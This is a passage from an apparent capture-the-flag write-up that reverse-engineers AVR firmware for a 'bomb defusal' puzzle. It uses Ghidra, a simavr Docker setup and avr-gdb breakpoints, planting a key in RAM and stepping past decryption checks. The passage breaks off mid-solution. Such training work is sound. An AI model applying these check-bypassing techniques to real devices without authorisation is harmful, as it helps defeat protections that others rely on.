<span class="normal"><a href="#__codelineno-7-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-7-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-7-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-7-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-7-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-7-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-7-10">10</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="w">  </span><span class="p">...</span>
</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2"></a><span class="w">  </span><span class="n">X</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">DAT_mem_0100</span><span class="p">;</span>
</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3"></a><span class="w">  </span><span class="n">Z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">DAT_codebyte_30be</span><span class="p">;</span>
</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4"></a><span class="w">  </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="n">puVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">X</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">byte</span><span class="p">)</span><span class="n">X</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mh">0x80</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">X</span><span class="p">.</span><span class="n">_1_1_</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="p">)(</span><span class="n">R17</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="p">((</span><span class="n">byte</span><span class="p">)</span><span class="n">X</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0x80</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5"></a><span class="w">    </span><span class="n">R0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">Z</span><span class="p">;</span>
</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6"></a><span class="w">    </span><span class="n">Z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Z</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7"></a><span class="w">    </span><span class="n">X</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">X</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8"></a><span class="w">    </span><span class="o">*</span><span class="n">puVar1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">R0</span><span class="p">;</span>
</span><span id="__span-7-9"><a id="__codelineno-7-9" name="__codelineno-7-9"></a><span class="w">  </span><span class="p">}</span>
</span><span id="__span-7-10"><a id="__codelineno-7-10" name="__codelineno-7-10"></a><span class="w">  </span><span class="p">...</span>
</span></code></pre></div></td></tr></table></div>
<p>When analyzing <code>main()</code>, it felt very overwhelming and chaotic. So, I shifted my focus to looking for defined strings to create some structure for my analysis. I started by searching for defined strings in the firmware:</p>
<p><img alt="" src="../assets/level-10-defined-strings.png" /></p>
<p>However, none of the strings seemed to be referenced elsewhere... or are they?</p>
<p>The writeup by <code>larsh</code> helps with explaining how data is loaded and how we can find string references: https://ctf.harrisongreen.me/2021/midnightsun/twi-light/. The writeup also references another writeup which included instructions on how to set up simavr for dynamic analysis: <a href="https://ctf.harrisongreen.me/2020/midnightsunctf/avr/">https://ctf.harrisongreen.me/2020/midnightsunctf/avr/</a>. They very nicely included the <code>Dockerfile</code> to setup the debugger:</p>
<div class="language-dockerfile highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Docker</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-8-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-8-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-8-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-8-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-8-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-8-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-8-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-8-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-8-10">10</a></span>
<span class="normal"><a href="#__codelineno-8-11">11</a></span>
<span class="normal"><a href="#__codelineno-8-12">12</a></span>
<span class="normal"><a href="#__codelineno-8-13">13</a></span>
<span class="normal"><a href="#__codelineno-8-14">14</a></span>
<span class="normal"><a href="#__codelineno-8-15">15</a></span>
<span class="normal"><a href="#__codelineno-8-16">16</a></span>
<span class="normal"><a href="#__codelineno-8-17">17</a></span>
<span class="normal"><a href="#__codelineno-8-18">18</a></span>
<span class="normal"><a href="#__codelineno-8-19">19</a></span>
<span class="normal"><a href="#__codelineno-8-20">20</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="k">FROM</span><span class="w"> </span><span class="s">ubuntu:18.04</span>
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2"></a>
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3"></a><span class="k">ENV</span><span class="w"> </span><span class="nv">DEBIAN_FRONTEND</span><span class="o">=</span>noninteractive
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4"></a>
</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5"></a><span class="k">RUN</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6"></a><span class="w">    </span>python-dev<span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7"></a><span class="w">    </span>picocom<span class="w"> </span>git<span class="w"> </span>gdb<span class="w"> </span>gcc-avr<span class="w"> </span>binutils-avr<span class="w"> </span>gdb-avr<span class="w"> </span>avr-libc<span class="w"> </span>avrdude<span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8"></a><span class="w">    </span>make<span class="w"> </span>gcc<span class="w"> </span>freeglut3-dev<span class="w"> </span>libelf-dev<span class="w"> </span>libncurses5-dev<span class="w"> </span>libncursesw5-dev<span class="w"> </span><span class="se">\</span>
</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9"></a><span class="w">    </span>simavr
</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10"></a>
</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11"></a><span class="k">WORKDIR</span><span class="w"> </span><span class="s">/src</span>
</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12"></a>
</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13"></a><span class="k">RUN</span><span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/buserror/simavr
</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14"></a>
</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15"></a><span class="k">ENV</span><span class="w"> </span>TERM<span class="w"> </span>xterm-256color
</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16"></a>
</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17"></a><span class="c"># the build fails midway through but it&#39;s ok</span>
</span><span id="__span-8-18"><a id="__codelineno-8-18" name="__codelineno-8-18"></a><span class="k">RUN</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>simavr<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">(</span>make<span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="o">)</span>
</span><span id="__span-8-19"><a id="__codelineno-8-19" name="__codelineno-8-19"></a>
</span><span id="__span-8-20"><a id="__codelineno-8-20" name="__codelineno-8-20"></a><span class="k">ENV</span><span class="w"> </span><span class="nv">SIMAVR_UART_XTERM</span><span class="o">=</span><span class="m">1</span>
</span></code></pre></div></td></tr></table></div>
<p>After reading the mentioned writeups, I learned how to calculate the RAM address of a defined string. We need to use the formula <code>&lt;address in ROM&gt; + 0x100 - 0x30BE</code>. It is also important to note that all the addresses in Ghidra seem to be halved, so remember to multiply them by 2 to get the actual ROM address.</p>
<p>Also some strings were not shown in Ghidra's <code>Defined Strings</code> window. They are <code>F8g3a_9V7G2$d#0h</code> and <code>39AB41D072C</code>.</p>
<p><img alt="" src="../assets/level-10-random-str1.png" /></p>
<p><img alt="" src="../assets/level-10-random-str2.png" /></p>
<p>We can note down some details of each defined string as shown below:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-9-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-9-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-9-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-9-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-9-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-9-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-9-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-9-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-9-10">10</a></span>
<span class="normal"><a href="#__codelineno-9-11">11</a></span>
<span class="normal"><a href="#__codelineno-9-12">12</a></span>
<span class="normal"><a href="#__codelineno-9-13">13</a></span>
<span class="normal"><a href="#__codelineno-9-14">14</a></span>
<span class="normal"><a href="#__codelineno-9-15">15</a></span>
<span class="normal"><a href="#__codelineno-9-16">16</a></span>
<span class="normal"><a href="#__codelineno-9-17">17</a></span>
<span class="normal"><a href="#__codelineno-9-18">18</a></span>
<span class="normal"><a href="#__codelineno-9-19">19</a></span>
<span class="normal"><a href="#__codelineno-9-20">20</a></span>
<span class="normal"><a href="#__codelineno-9-21">21</a></span>
<span class="normal"><a href="#__codelineno-9-22">22</a></span>
<span class="normal"><a href="#__codelineno-9-23">23</a></span>
<span class="normal"><a href="#__codelineno-9-24">24</a></span>
<span class="normal"><a href="#__codelineno-9-25">25</a></span>
<span class="normal"><a href="#__codelineno-9-26">26</a></span>
<span class="normal"><a href="#__codelineno-9-27">27</a></span>
<span class="normal"><a href="#__codelineno-9-28">28</a></span>
<span class="normal"><a href="#__codelineno-9-29">29</a></span>
<span class="normal"><a href="#__codelineno-9-30">30</a></span>
<span class="normal"><a href="#__codelineno-9-31">31</a></span>
<span class="normal"><a href="#__codelineno-9-32">32</a></span>
<span class="normal"><a href="#__codelineno-9-33">33</a></span>
<span class="normal"><a href="#__codelineno-9-34">34</a></span>
<span class="normal"><a href="#__codelineno-9-35">35</a></span>
<span class="normal"><a href="#__codelineno-9-36">36</a></span>
<span class="normal"><a href="#__codelineno-9-37">37</a></span>
<span class="normal"><a href="#__codelineno-9-38">38</a></span>
<span class="normal"><a href="#__codelineno-9-39">39</a></span>
<span class="normal"><a href="#__codelineno-9-40">40</a></span>
<span class="normal"><a href="#__codelineno-9-41">41</a></span>
<span class="normal"><a href="#__codelineno-9-42">42</a></span>
<span class="normal"><a href="#__codelineno-9-43">43</a></span>
<span class="normal"><a href="#__codelineno-9-44">44</a></span>
<span class="normal"><a href="#__codelineno-9-45">45</a></span>
<span class="normal"><a href="#__codelineno-9-46">46</a></span>
<span class="normal"><a href="#__codelineno-9-47">47</a></span>
<span class="normal"><a href="#__codelineno-9-48">48</a></span>
<span class="normal"><a href="#__codelineno-9-49">49</a></span>
<span class="normal"><a href="#__codelineno-9-50">50</a></span>
<span class="normal"><a href="#__codelineno-9-51">51</a></span>
<span class="normal"><a href="#__codelineno-9-52">52</a></span>
<span class="normal"><a href="#__codelineno-9-53">53</a></span>
<span class="normal"><a href="#__codelineno-9-54">54</a></span>
<span class="normal"><a href="#__codelineno-9-55">55</a></span>
<span class="normal"><a href="#__codelineno-9-56">56</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>code:18cb.1: &quot;Wrong decryption&quot;
</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>- ROM address: 0x3196
</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>- RAM address: 0x1D9
</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4"></a>- Resides at code:07fe (inside FUN_code_07f8)
</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5"></a>
</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6"></a>code:18d4: &quot;or no key chip!&quot;
</span><span id="__span-9-7"><a id="__codelineno-9-7" name="__codelineno-9-7"></a>- ROM address: 0x31A8
</span><span id="__span-9-8"><a id="__codelineno-9-8" name="__codelineno-9-8"></a>- RAM address: 0x1EA
</span><span id="__span-9-9"><a id="__codelineno-9-9" name="__codelineno-9-9"></a>- Resides at code:0808 (inside FUN_code_07f8)
</span><span id="__span-9-10"><a id="__codelineno-9-10" name="__codelineno-9-10"></a>
</span><span id="__span-9-11"><a id="__codelineno-9-11" name="__codelineno-9-11"></a>code:18dc: &quot;Less time now!&quot;
</span><span id="__span-9-12"><a id="__codelineno-9-12" name="__codelineno-9-12"></a>- ROM address: 0x31B8
</span><span id="__span-9-13"><a id="__codelineno-9-13" name="__codelineno-9-13"></a>- RAM address: 0x1FA
</span><span id="__span-9-14"><a id="__codelineno-9-14" name="__codelineno-9-14"></a>
</span><span id="__span-9-15"><a id="__codelineno-9-15" name="__codelineno-9-15"></a>code:18e3.1: &quot;F8g3a_9V7G2$d#0h&quot;
</span><span id="__span-9-16"><a id="__codelineno-9-16" name="__codelineno-9-16"></a>- ROM address: 0x31C6
</span><span id="__span-9-17"><a id="__codelineno-9-17" name="__codelineno-9-17"></a>- RAM address: 0x209
</span><span id="__span-9-18"><a id="__codelineno-9-18" name="__codelineno-9-18"></a>- Resides at code:0d3e
</span><span id="__span-9-19"><a id="__codelineno-9-19" name="__codelineno-9-19"></a>
</span><span id="__span-9-20"><a id="__codelineno-9-20" name="__codelineno-9-20"></a>code:18ec: &quot;Read key chip:&quot;
</span><span id="__span-9-21"><a id="__codelineno-9-21" name="__codelineno-9-21"></a>- ROM address: 0x31D8
</span><span id="__span-9-22"><a id="__codelineno-9-22" name="__codelineno-9-22"></a>- RAM address: 0x21A
</span><span id="__span-9-23"><a id="__codelineno-9-23" name="__codelineno-9-23"></a>- Resides at code:0de5
</span><span id="__span-9-24"><a id="__codelineno-9-24" name="__codelineno-9-24"></a>
</span><span id="__span-9-25"><a id="__codelineno-9-25" name="__codelineno-9-25"></a>code:18f3.1: GoodLuckDefusing&quot;
</span><span id="__span-9-26"><a id="__codelineno-9-26" name="__codelineno-9-26"></a>- ROM address: 0x31E6
</span><span id="__span-9-27"><a id="__codelineno-9-27" name="__codelineno-9-27"></a>- RAM address: 0x229
</span><span id="__span-9-28"><a id="__codelineno-9-28" name="__codelineno-9-28"></a>- Resides at code:0dff
</span><span id="__span-9-29"><a id="__codelineno-9-29" name="__codelineno-9-29"></a>
</span><span id="__span-9-30"><a id="__codelineno-9-30" name="__codelineno-9-30"></a>code:18fc: &quot;THIS BOMB&quot;
</span><span id="__span-9-31"><a id="__codelineno-9-31" name="__codelineno-9-31"></a>- ROM address: 0x31F8
</span><span id="__span-9-32"><a id="__codelineno-9-32" name="__codelineno-9-32"></a>- RAM address: 0x23A
</span><span id="__span-9-33"><a id="__codelineno-9-33" name="__codelineno-9-33"></a>
</span><span id="__span-9-34"><a id="__codelineno-9-34" name="__codelineno-9-34"></a>code:1901: &quot;Enter Code:&quot;
</span><span id="__span-9-35"><a id="__codelineno-9-35" name="__codelineno-9-35"></a>- ROM address: 0x3202
</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36"></a>- RAM address: 0x245
</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37"></a>- Resides at code:0e44 and code:1439
</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38"></a>
</span><span id="__span-9-39"><a id="__codelineno-9-39" name="__codelineno-9-39"></a>code:1907: &quot;BOOM!&quot;
</span><span id="__span-9-40"><a id="__codelineno-9-40" name="__codelineno-9-40"></a>- ROM address: 0x320E
</span><span id="__span-9-41"><a id="__codelineno-9-41" name="__codelineno-9-41"></a>- RAM address: 0x250
</span><span id="__span-9-42"><a id="__codelineno-9-42" name="__codelineno-9-42"></a>- Resides at code:0ebc
</span><span id="__span-9-43"><a id="__codelineno-9-43" name="__codelineno-9-43"></a>
</span><span id="__span-9-44"><a id="__codelineno-9-44" name="__codelineno-9-44"></a>code:190a: &quot;Game Over :)&quot;
</span><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45"></a>- ROM address: 0x3214
</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46"></a>- RAM address: 0x256
</span><span id="__span-9-47"><a id="__codelineno-9-47" name="__codelineno-9-47"></a>- at code:0ce6
</span><span id="__span-9-48"><a id="__codelineno-9-48" name="__codelineno-9-48"></a>
</span><span id="__span-9-49"><a id="__codelineno-9-49" name="__codelineno-9-49"></a>code:1910.1: &quot;39AB41D072C&quot;
</span><span id="__span-9-50"><a id="__codelineno-9-50" name="__codelineno-9-50"></a>- ROM address: 0x3220
</span><span id="__span-9-51"><a id="__codelineno-9-51" name="__codelineno-9-51"></a>- RAM address: 0x263
</span><span id="__span-9-52"><a id="__codelineno-9-52" name="__codelineno-9-52"></a>
</span><span id="__span-9-53"><a id="__codelineno-9-53" name="__codelineno-9-53"></a>code:1916.1: &quot;Bomb defused!&quot;
</span><span id="__span-9-54"><a id="__codelineno-9-54" name="__codelineno-9-54"></a>- ROM address: 0x322C
</span><span id="__span-9-55"><a id="__codelineno-9-55" name="__codelineno-9-55"></a>- RAM address: 0x26F
</span><span id="__span-9-56"><a id="__codelineno-9-56" name="__codelineno-9-56"></a>- Resides at code:136d
</span></code></pre></div></td></tr></table></div>
<p>From here, we can annotate where the strings are being used. After annotating, you will notice that the function <code>FUN_code_07e9</code> is always called immediately afterward. This is likely the function responsible for displaying the string. Therefore, we can rename <code>FUN_code_07e9</code> to <code>display_string</code>.</p>
<p>Between displaying <code>Read key chip:</code> and <code>GoodLuckDefusing</code>, it displays a string from the RAM address <code>0x3dd</code>:</p>
<p><img alt="" src="../assets/level-10-display-read-key-chip.png" /></p>
<p>Cross-referencing with the Wokwi project, this appears to be displaying the secret key:</p>
<p><img alt="" src="../assets/level-10-display-key.png" /></p>
<p>When performing dynamic analysis later on, we can manually break at the call to the <code>display_string</code> instruction and manually write the secret key to <code>0x33d</code>. This allows the firmware to perform subsequent logic that may require the key.</p>
<p>This is where we want our execution to eventually flow to:</p>
<p><img alt="" src="../assets/level-10-end-goal.png" /></p>
<p>Keep in mind that we want to avoid branches that lead to the call of <code>FUN_code_07f8</code>, which will display <code>Wrong decryption</code>.</p>
<p>With all the information at hand, we can now proceed with dynamic analysis. We first need to set up <code>simavr</code>. This can be done with the following commands:</p>
<div class="language-sh highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-10-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-10-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-10-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-10-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-10-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-10-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-10-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-10-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-10-10">10</a></span>
<span class="normal"><a href="#__codelineno-10-11">11</a></span>
<span class="normal"><a href="#__codelineno-10-12">12</a></span>
<span class="normal"><a href="#__codelineno-10-13">13</a></span>
<span class="normal"><a href="#__codelineno-10-14">14</a></span>
<span class="normal"><a href="#__codelineno-10-15">15</a></span>
<span class="normal"><a href="#__codelineno-10-16">16</a></span>
<span class="normal"><a href="#__codelineno-10-17">17</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="c1"># terminal 1: set up docker container</span>
</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a>docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>image_simavr<span class="w"> </span>.
</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a>docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>-i<span class="w"> </span>-t<span class="w"> </span>image_simavr<span class="w"> </span>/bin/bash
</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a>docker<span class="w"> </span>container<span class="w"> </span>ls
</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a>docker<span class="w"> </span>cp<span class="w"> </span>firmware.hex<span class="w"> </span>&lt;container<span class="w"> </span>id&gt;:/src
</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>
</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="c1"># terminal 2: run simavr</span>
</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a>docker<span class="w"> </span>run<span class="w"> </span>-i<span class="w"> </span>-t<span class="w"> </span>image_simavr<span class="w"> </span>/bin/bash
</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="nb">cd</span><span class="w"> </span>simavr/examples/board_simduino/obj-x86_64-linux-gnu/
</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10"></a>./simduino.elf<span class="w"> </span>-d<span class="w"> </span>/src/firmware.hex
</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11"></a>
</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12"></a><span class="c1"># terminal 3: run avr-gdb, connect to debugging port</span>
</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13"></a>docker<span class="w"> </span>run<span class="w"> </span>-i<span class="w"> </span>-t<span class="w"> </span>image_simavr<span class="w"> </span>/bin/bash
</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14"></a>avr-gdb
</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15"></a><span class="c1">## in avr-gdb</span>
</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16"></a><span class="c1"># target remote :1234</span>
</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17"></a><span class="c1"># set disassemble-next-line on</span>
</span></code></pre></div></td></tr></table></div>
<p><img alt="" src="../assets/level-10-start-simavr.png" /></p>
<p>One thing to note when using <code>avr-gdb</code> is that when setting a breakpoint at a ROM address, it can lead to unexpected behavior due to the way AVR's modified Harvard architecture handles memory. Specifically, the same address can refer to both ROM and RAM, leading to potential confusion. As explained in this <a href="https://stackoverflow.com/a/46337874">StackOverflow</a> answer, <code>avr-gdb</code> handles this architecture. The issue arises because ROM and RAM share address spaces, and <code>avr-gdb</code> distinguishes between them by utilizing different address spaces. Understanding how to reference ROM and RAM addresses correctly in <code>avr-gdb</code> is crucial to avoid issues when setting breakpoints.</p>
<p>With all the information in mind, we can proceed with debugging the firmware. The key steps involve adding the key chip in RAM at <code>0x33d</code> by setting a breakpoint at the ROM address <code>0x1BDE</code>. We should also bypass specific checks that would lead to the <code>FUN_code_07f8</code> function, which displays the message <code>Wrong decryption</code>. By constantly bypassing those checks, we will eventually reach ROM address <code>0x26DA</code>, where the message <code>Bomb defused!</code> is displayed. At this point, we can inspect the RAM for any presence of a flag.</p>
<h2 id="solution">Solution</h2>
<p>Here are the final <code>avr-gdb</code> commands to execute, summarizing what was mentioned in the previous paragraph:</p>
<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-11-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-11-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-11-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-11-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-11-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-11-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-11-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-11-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-11-10">10</a></span>
<span class="normal"><a href="#__codelineno-11-11">11</a></span>
<span class="normal"><a href="#__codelineno-11-12">12</a></span>
<span class="normal"><a href="#__codelineno-11-13">13</a></span>
<span class="normal"><a href="#__codelineno-11-14">14</a></span>
<span class="normal"><a href="#__codelineno-11-15">15</a></span>
<span class="normal"><a href="#__codelineno-11-16">16</a></span>
<span class="normal"><a href="#__codelineno-11-17">17</a></span>
<span class="normal"><a href="#__codelineno-11-18">18</a></span>
<span class="normal"><a href="#__codelineno-11-19">19</a></span>
<span class="normal"><a href="#__codelineno-11-20">20</a></span>
<span class="normal"><a href="#__codelineno-11-21">21</a></span>
<span class="normal"><a href="#__codelineno-11-22">22</a></span>
<span class="normal"><a href="#__codelineno-11-23">23</a></span>
<span class="normal"><a href="#__codelineno-11-24">24</a></span>
<span class="normal"><a href="#__codelineno-11-25">25</a></span>
<span class="normal"><a href="#__codelineno-11-26">26</a></span>
<span class="normal"><a href="#__codelineno-11-27">27</a></span>
<span class="normal"><a href="#__codelineno-11-28">28</a></span>
<span class="normal"><a href="#__codelineno-11-29">29</a></span>
<span class="normal"><a href="#__codelineno-11-30">30</a></span>
<span class="normal"><a href="#__codelineno-11-31">31</a></span>
<span class="normal"><a href="#__codelineno-11-32">32</a></span>
<span class="normal"><a href="#__codelineno-11-33">33</a></span>
<span class="normal"><a href="#__codelineno-11-34">34</a></span>
<span class="normal"><a href="#__codelineno-11-35">35</a></span>
<span class="normal"><a href="#__codelineno-11-36">36</a></span>
<span class="normal"><a href="#__codelineno-11-37">37</a></span>
<span class="normal"><a href="#__codelineno-11-38">38</a></span>
<span class="normal"><a href="#__codelineno-11-39">39</a></span>
<span class="normal"><a href="#__codelineno-11-40">40</a></span>
<span class="normal"><a href="#__codelineno-11-41">41</a></span>
<span class="normal"><a href="#__codelineno-11-42">42</a></span>
<span class="normal"><a href="#__codelineno-11-43">43</a></span>
<span class="normal"><a href="#__codelineno-11-44">44</a></span>
<span class="normal"><a href="#__codelineno-11-45">45</a></span>
<span class="normal"><a href="#__codelineno-11-46">46</a></span>
<span class="normal"><a href="#__codelineno-11-47">47</a></span>
<span class="normal"><a href="#__codelineno-11-48">48</a></span>
<span class="normal"><a href="#__codelineno-11-49">49</a></span>
<span class="normal"><a href="#__codelineno-11-50">50</a></span>
<span class="normal"><a href="#__codelineno-11-51">51</a></span>
<span class="normal"><a href="#__codelineno-11-52">52</a></span>
<span class="normal"><a href="#__codelineno-11-53">53</a></span>
<span class="normal"><a href="#__codelineno-11-54">54</a></span>
<span class="normal"><a href="#__codelineno-11-55">55</a></span>
<span class="normal"><a href="#__codelineno-11-56">56</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a># Setup avr-gdb
</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>target remote :1234
</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a>set disassemble-next-line on
</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a>
</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a># Breakpoint 1: Right before displaying &quot;Read key chip:&quot;
</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>b *($pc+0x1BDE)
</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a>
</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8"></a># Breakpoint 2, 3, 4, 5: Some if-statement, loop right before
</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9"></a>b *($pc+0x2044)
</span><span id="__span-11-10"><a id="__codelineno-11-10" name="__codelineno-11-10"></a>b *($pc+0x204E)
</span><span id="__span-11-11"><a id="__codelineno-11-11" name="__codelineno-11-11"></a>b *($pc+0x205C)
